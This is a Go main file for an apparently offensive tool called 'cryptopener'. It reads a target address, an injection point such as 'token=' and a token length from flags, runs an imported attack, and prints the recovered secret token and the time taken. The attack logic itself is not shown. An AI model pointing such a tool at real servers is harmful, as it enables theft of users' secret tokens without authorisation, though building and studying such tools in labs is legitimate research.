package main

import (
	"fmt"
	"flag"
	"time"
	cryptopener "github.com/larikuistio/cryptopener"
)


func main() {

	var target string
	var entrypoint string
	var length int
	flag.StringVar(&target, "target", "127.0.0.1:8080", "target address of attack")
	flag.StringVar(&entrypoint, "entrypoint", "token=", "entrypoint of attck")
	flag.IntVar(&length, "length", 64, "length of secret token")

	flag.Parse()
	start := time.Now()
	cryptopener := cryptopener.NewCryptopener(target, entrypoint, length)
	cryptopener.Run()
	defer func ()  {
		end := time.Now()
		fmt.Printf("Found token in %.2f seconds, tokens is %s", end.Sub(start).Seconds(), cryptopener.ResultToken)
	}()
}
